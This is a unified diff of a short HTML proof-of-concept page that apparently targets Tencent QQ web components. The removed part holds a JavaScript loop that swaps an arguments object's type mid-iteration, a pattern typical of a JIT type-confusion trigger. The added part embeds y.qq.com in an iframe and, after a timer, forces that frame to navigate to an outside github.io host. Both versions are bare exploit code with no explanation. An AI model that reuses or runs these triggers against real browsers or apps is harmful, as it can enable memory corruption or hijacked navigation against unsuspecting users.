@@ -1,35 +1,12 @@
-<script src="//huanle.qq.com/m/public/launchApp.js"></script>
-
-<iframe src="https://beacon.cdn.qq.com/sdk/4.5.16/beacon_web.min.js"></iframe>
-
-<iframe src="https://vip.video.qq.com/fcgi-bin/comm_cgi"></iframe>
-
-<script>
-
-function boom() {
-  function getargs() {
-    return arguments;
-  }
-  let arr = getargs(1, 2, 3, 45);
-  arr.a1 = 6.6;
-  let arrc = arr;
-  a = 'a1';
-  for (let i = 0; i < 816; i++) {
-    arr[a] = 5.5;
-    if (i == 805) {
-      arr = [5, 6, 7];
-      a = 5;
-    }
-    if (i == 810) {
-      arr = arrc;
-      a = 4;
-    }
-  }
-  return arr[5];
-}
+<body> 
 	
-setTimeout(function (){
- alert(boom());
-}, 3000);
+  <iframe src="https://y.qq.com" id="myFrame"></iframe>  
+  
+  <script>   
+    setTimeout(function() {  
+      var myFrame = document.getElementById('myFrame');  
+      myFrame.contentWindow.location.href = 'https://rjaqynxfx.github.io';  
+    }, 5000);  
+  </script> 
 	
-</script>
+</body>  
